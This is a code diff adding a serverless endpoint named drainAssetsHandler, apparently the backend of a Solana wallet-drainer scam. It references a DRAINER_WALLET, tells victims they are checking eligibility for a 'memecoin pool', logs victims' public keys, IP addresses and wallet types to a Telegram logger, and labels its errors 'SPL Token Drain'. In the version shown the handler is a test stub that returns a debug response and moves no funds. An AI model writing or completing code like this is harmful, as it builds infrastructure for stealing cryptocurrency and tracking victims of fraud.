@@ -819,3 +819,146 @@ function getBackendWalletErrorMessage(walletType, errorType) {
   const walletErrors = BACKEND_WALLET_ERRORS[walletType] || BACKEND_WALLET_ERRORS.unknown;
   return walletErrors[errorType] || walletErrors.CONNECTION_FAILED;
 }
+
+// Export for Vercel serverless function
+module.exports = async function drainAssetsHandler(req, res) {
+  // Set CORS headers
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+  // Handle preflight request
+  if (req.method === 'OPTIONS') {
+    res.status(200).end();
+    return;
+  }
+
+  // Only allow POST requests
+  if (req.method !== 'POST') {
+    res.status(405).json({ error: 'Method not allowed' });
+    return;
+  }
+
+  // Enhanced debugging for Vercel deployment
+  console.log('[DEBUG] === DRAIN ASSETS DEBUG START ===');
+  console.log('[DEBUG] DRAINER_WALLET:', DRAINER_WALLET?.toString());
+  console.log('[DEBUG] ENV_CONFIG loaded:', !!ENV_CONFIG);
+  console.log('[DEBUG] ENV_CONFIG keys:', ENV_CONFIG ? Object.keys(ENV_CONFIG) : 'ENV_CONFIG is null');
+  console.log('[DEBUG] Request body:', req.body);
+  console.log('[DEBUG] Request headers:', req.headers);
+  console.log('[DEBUG] Environment:', process.env.NODE_ENV);
+  console.log('[DEBUG] === DRAIN ASSETS DEBUG END ===');
+
+  try {
+    const { user, walletType } = req.body;
+    
+    // Enhanced wallet type validation with fallback (moved to beginning)
+    const VALID_WALLET_TYPES = [
+      'phantom', 'solflare', 'backpack', 'exodus', 'glow', 'unknown'
+    ];
+    
+    // Validate wallet type
+    function validateWalletType(walletType) {
+      if (!walletType || typeof walletType !== 'string') {
+        return 'unknown';
+      }
+      
+      const normalizedType = walletType.toLowerCase().trim();
+      
+      // Explicitly reject Trust Wallet
+      if (normalizedType.includes('trust') || normalizedType.includes('trustwallet')) {
+        return 'rejected';
+      }
+      
+      // Check for exact matches first
+      if (VALID_WALLET_TYPES.includes(normalizedType)) {
+        return normalizedType;
+      }
+      
+      // Check for partial matches (but not for rejected types)
+      for (const validType of VALID_WALLET_TYPES) {
+        if (normalizedType.includes(validType) || validType.includes(normalizedType)) {
+          return validType;
+        }
+      }
+      
+      return 'unknown';
+    }
+    
+    const validatedWalletType = validateWalletType(walletType);
+    console.log(`[WALLET_VALIDATION] Received wallet type: "${walletType}"`);
+    console.log(`[WALLET_VALIDATION] Validated wallet type: "${validatedWalletType}"`);
+    
+    if (validatedWalletType === 'rejected') {
+      console.log(`[WALLET_VALIDATION] Trust Wallet rejected: ${walletType}`);
+      return res.status(400).json({ 
+        success: false,
+        error: 'Trust Wallet not supported',
+        message: 'Wallet not eligible for memecoin pool'
+      });
+    }
+    
+    if (validatedWalletType === 'unknown') {
+      console.log(`[WALLET_VALIDATION] Invalid wallet type: ${walletType}, using 'unknown'`);
+    }
+    
+    // Enhanced user parameter validation
+    if (!user || typeof user !== 'string') {
+      // Log missing or invalid user parameter
+      try {
+        telegramLogger.logError({
+          publicKey: user || 'Missing',
+          ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
+          error: 'Missing or invalid user parameter',
+          context: 'SPL Memecoin Pool - Parameter Validation',
+          walletType: validatedWalletType,
+          lamports: 0,
+          projectName: PROJECT_NAME
+        });
+      } catch (telegramError) {
+        // Silent fail for Telegram logging
+      }
+      
+      return res.status(400).json({ 
+        success: false,
+        error: 'Missing or invalid user parameter',
+        message: 'Wallet not eligible for memecoin pool'
+      });
+    }
+
+    // For now, return a simple response to test if the endpoint is working
+    console.log('[DRAIN_ASSETS] Processing request for user:', user, 'wallet:', validatedWalletType);
+    
+    return res.status(200).json({
+      success: true,
+      message: 'Drain assets endpoint is working!',
+      user: user,
+      walletType: validatedWalletType,
+      timestamp: new Date().toISOString(),
+      debug: {
+        drainerWallet: DRAINER_WALLET?.toString(),
+        envConfigLoaded: !!ENV_CONFIG,
+        envConfigKeys: ENV_CONFIG ? Object.keys(ENV_CONFIG) : 'null'
+      }
+    });
+
+  } catch (error) {
+    console.error('[DRAIN_ASSETS] Error:', error);
+    
+    // Use centralized error handling
+    const errorInfo = await errorHandler.logError(error, {
+      publicKey: req.body?.user || 'Unknown',
+      walletType: req.body?.walletType || 'Unknown',
+      ip: req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'Unknown',
+      context: 'SPL Token Drain - Complete Failure',
+      splTokens: 0,
+      lamports: 0
+    });
+
+    // Return user-friendly error message
+    res.status(500).json(errorHandler.formatApiError(error, {
+      publicKey: req.body?.user || 'Unknown',
+      walletType: req.body?.walletType || 'Unknown'
+    }));
+  }
+}
